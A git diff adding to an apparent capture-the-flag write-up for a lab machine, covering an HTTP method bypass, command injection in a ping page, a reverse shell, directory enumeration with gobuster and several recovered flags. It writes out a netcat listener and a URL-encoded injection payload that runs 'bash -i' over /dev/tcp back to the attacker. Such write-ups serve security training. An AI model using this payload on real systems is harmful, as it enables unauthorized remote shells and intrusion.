@@ -268,71 +268,73 @@ The following command can reveal if any PHP-based pages on the UCM site contain 
 
       <img width="886" height="270" alt="image" src="https://github.com/user-attachments/assets/2f8c243b-def5-4228-8639-04913d03be8b" />
 
+      "Before reaching this point, we had to capture the request by configuring FoxyProxy. Once captured, we sent it to the Repeater, where we changed the request method from GET to POST and inserted the directory index.php.
+      After sending it, we received a 200 OK response and the following flag was displayed":
+      **FLAG{BYPASS1NG_HTTP_METH0DS_G00D!}**
 
+     "We will now take advantage of the opportunity and check what is inside Ping-Pong:"
+
+     <img width="800" height="84" alt="image" src="https://github.com/user-attachments/assets/6d490115-da1d-4af2-9615-2d3d7de4ad18" />
+
+     "It gives us this message, which is a very clear hint of a 'Command Injection' vulnerability."
+
+     <img width="800" height="537" alt="image" src="https://github.com/user-attachments/assets/39c57bf2-e009-411f-a816-b55cf2f4cb8b" />
+     <img width="800" height="537" alt="image" src="https://github.com/user-attachments/assets/29b7086b-12c5-4e51-988b-d30422b1d1cb" />
+
+       "We already know that we can navigate using commands in the taskbar. In fact, when we use the ls command, we find a file named estonoesunaflag.txt. We use cat to read it and obtain the following:
+
+       **FLAG{SIMPLEMENTE_RCE}**
      
+       **FLAG{SIMPLEMENTE_RCE}**
 
+       Now we will use a reverse shell to try to connect to the machine — or more accurately, to make the machine connect back to us.
+        We use the following command:
+
+          nc -lvnp 4444
+
+     And in the browser, we visit:
+
+         http://192.168.1.141/ping/index.php?ip=127.0.0.1;bash+-c+%27bash+-i+%3E%26+/dev/tcp/192.168.1.141/4444+0%3E%261%27
+
+     to establish the connection."
+
+     <img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/218986e6-8f35-489d-bdc4-2508e734dfeb" />
+     <img width="800" height="431" alt="image" src="https://github.com/user-attachments/assets/41cb7fe4-8ed6-499d-95cb-7071700ff31b" />
+     <img width="700" height="500" alt="image" src="https://github.com/user-attachments/assets/63698342-27b3-4be7-a705-e0e70faa241f" />
+
+       We check each directory one by one, trying to find more information.
+       We attempt persistence and succeed — in the Deloitte directory, we find a flag and a name: james.
+       The flag is:
      
+       **FLAG{W311_D0N3_R00T_1S_W41T1nG_U}**
 
-    
+      In the /opt directory, we find more data. Using ChatGPT, we determine that it is a Base64-encoded string:
 
-   
-    
+         RkxBRyB7WTB1X2FyZSBhIHJlYWwgSGFja2VyfQo=
 
-    
+     We use AI to decode it.
 
+     <img width="800" height="467" alt="image" src="https://github.com/user-attachments/assets/8ffdb7b3-28e7-4159-8492-55acb56ff276" />
 
+      **FLAG: F L A G  {Y0u_ar_e_a_real_Hacker}**
 
+     "Now we will search for hidden directories.
+      We use the following command:
 
+         gobuster dir -u http://192.168.1.141/ -w /usr/share/wordlists/dirb/common.txt -t 30 -x php,txt,html -o gobuster_resultados.txt
 
-
-    
-
-    
-
-
-    
-
-    
-
-    
+     This command scans for hidden directories and files with .php, .txt, and .html extensions, using the common wordlist and 30 threads. The results are saved in gobuster_resultados.txt."
 
 
+     <img width="800" height="800" alt="image" src="https://github.com/user-attachments/assets/d07f76c3-f72a-4143-8416-95088358ccaf" />
+
+     We observe that several directories are found.
+     However, we only manage to retrieve one flag at the following path:
      
+     **http://192.168.1.141/uploads/**
 
-
+     **FLAG: FLAG{ENUMERA_DIRECTORIOS_SIEMPRE**
      
-
-
-
-     
-
-     
-
-
-     
-
-     
-
-
-
-
-
-
-
-
-     
-
-
-
-   
-
-
-
-
-
-
-  
-
 
    
 ---
